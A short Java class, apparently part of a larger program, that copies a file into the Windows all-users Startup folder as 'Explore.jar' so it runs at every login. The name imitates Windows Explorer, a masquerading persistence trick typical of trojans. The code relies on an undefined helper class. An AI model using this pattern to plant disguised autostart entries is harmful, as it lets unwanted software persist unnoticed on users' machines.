
import java.io.*;

public class autostart {
    File f = null;

    public autostart(String filename) {
        f = new File(filename);
    }

    public boolean set_it_autostart() throws Exception {
        System.out.println("f.exits=" + f.exists());
        if (!f.exists())
            return false;
        else {
            File startfile = new File("C:" + File.separator + "Documents and Settings" + File.separator + "All Users" + File.separator + "「开始」菜单" + File.separator + "程序" + File.separator + "启动" + File.separator + "Explore.jar");
            if (!startfile.exists())
                startfile.createNewFile();
            copyfile(f, startfile);
            return true;
        }

    }

    public static void copyfile(File source, File dest) throws IOException {
        byte b[] = new byte[100];
        FileInputStream in = new FileInputStream(source);
        FileOutputStream out = new FileOutputStream(dest);
        DataOutputStream dataout = new DataOutputStream(out);
        fileControlOut cp = new fileControlOut(dataout);
        cp.copyfile(source);

    }
}
